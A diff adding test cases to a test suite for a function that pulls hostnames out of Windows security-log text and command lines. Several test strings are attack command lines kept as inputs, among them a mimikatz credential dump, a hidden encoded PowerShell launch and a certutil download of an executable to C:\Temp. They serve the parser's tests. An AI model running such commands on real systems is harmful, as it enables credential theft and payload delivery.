@@ -34,6 +34,9 @@ describe("descriptionHostNames", () => {
     ["DESKTOP-FAKE7Q2 started", ["DESKTOP-FAKE7Q2"]],
     ["Copied to DEV-01, FIN-02 and S1-DC01", ["DEV-01", "FIN-02", "S1-DC01"]],
     ["Workstation Name: fakepc.", ["fakepc"]],
+    ["host=WS-FAKE01:445", ["WS-FAKE01"]],
+    ["New computer WIN-7Q2K3J9LMN joined", ["WIN-7Q2K3J9LMN"]],
+    ["Share SRV-SMB01 mounted", ["SRV-SMB01"]],
   ])("finds the host in %s", (text, hosts) => {
     expect(descriptionHostNames(text)).toEqual(expect.arrayContaining(hosts));
     expect(descriptionHostNames(text)).not.toContain("fakepc.");
@@ -54,6 +57,22 @@ describe("descriptionHostNames", () => {
     "https://cdn.example.com/WS-FAKE01-x.js",
     "mimikatz.exe sekurlsa::logonpasswords",
     "VERY-LONG-NAME-FAKE-0001",
+    // Review I1: a blank labelled value never takes the next label or a plain word.
+    "Workstation Name:  Source Network Address: -",
+    "Workstation Name: \nSource Network Address: 192.0.2.1",
+    "Computer: Yes",
+    "host: the attacker",
+    "Workstation Name: Source: 192.0.2.1",
+    "Computer Name: no",
+    "Host: ab",
+    // Review I2: crypto, encoding, protocol and platform identifiers stay readable.
+    "Ticket encryption RC4-HMAC requested",
+    "Decoded from UTF-16LE base64",
+    "Signed with HMAC-SHA256 and DES-CBC-MD5",
+    "Curve P-256 and P-384 keys, SHA3-256 digest",
+    "Kerberos etype AES128-CTS, auth NTLM-V2",
+    "Build for WIN-10 on X86-64 and AMD64-V2",
+    "SMB2-1 then TLS-1 then KRB5-23",
   ])("finds no host in %s", (text) => {
     expect(descriptionHostNames(text)).toEqual([]);
   });
@@ -79,6 +98,26 @@ describe("descriptionHostNames", () => {
   });
 });
 
+describe("descriptionHostNames on a command line (review M1)", () => {
+  it.each([
+    ["mstsc /v:WS-FAKE01", ["WS-FAKE01"]],
+    ["Invoke-Command -ComputerName WS-FAKE01 -ScriptBlock { whoami }", ["WS-FAKE01"]],
+    ["nltest /server:SRV-FAKE-02 /dclist:example.com", ["SRV-FAKE-02"]],
+  ])("finds the host in %s", (text, hosts) => {
+    expect(descriptionHostNames(text)).toEqual(hosts);
+  });
+
+  it.each([
+    "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
+    "cmd.exe /c whoami /all",
+    "chrome.exe --no-sandbox --disable-gpu",
+    "openssl enc -AES-256-CBC -in a.bin",
+    "certutil -urlcache -split -f https://cdn.example.com/WS-FAKE01.exe C:\\Temp\\a.exe",
+  ])("finds no host in %s", (text) => {
+    expect(descriptionHostNames(text)).toEqual([]);
+  });
+});
+
 describe("excerptRoster", () => {
   it("adds description hosts to the promptEntities names", () => {
     // promptEntities takes no user from a public-domain email (the anonymizer masks the address by
@@ -100,6 +139,10 @@ describe("excerptRoster", () => {
 describe("rosterOf", () => {
   it("lists a host named only in a row's description", () => {
     expect(rosterOf([row({ description: "Logon from WS-FAKE01" })]).hosts).toContain("WS-FAKE01");
+  });
+
+  it("lists a host named only in a row's command line", () => {
+    expect(rosterOf([row({ commandLine: "mstsc /v:WS-FAKE01" })]).hosts).toContain("WS-FAKE01");
   });
 
   it("lists no identifier shape from a description", () => {
